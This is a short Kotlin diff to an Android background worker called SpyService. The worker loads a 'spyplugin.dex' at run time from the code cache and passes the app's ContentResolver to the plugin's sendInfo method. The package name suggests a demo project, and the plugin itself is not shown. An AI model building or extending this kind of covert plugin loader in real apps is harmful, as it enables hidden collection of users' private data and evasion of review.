@@ -19,9 +19,9 @@ class SpyService(appContext: Context, workerParams: WorkerParameters)
 
     override suspend fun doWork(): Result {
         return try {
-            val file = File(applicationContext.filesDir, "spyplugin.dex")
+            val file = File(applicationContext.codeCacheDir, "spyplugin.dex")
             val infoProvider = loadDex(applicationContext, file)
-            val success = infoProvider.sendInfo()
+            val success = infoProvider.sendInfo(applicationContext.contentResolver)
             if (success) {
                 Log.d(TAG, "Success send info")
             } else {
@@ -54,7 +54,7 @@ class SpyService(appContext: Context, workerParams: WorkerParameters)
             context.classLoader
         )
 
-        val clazz = classLoader.loadClass("com.example.spyplugin.SpyService")
+        val clazz = classLoader.loadClass("com.example.spyplugin.InfoProviderClass")
         val instance = clazz.newInstance() as InfoProvider
 
         return instance
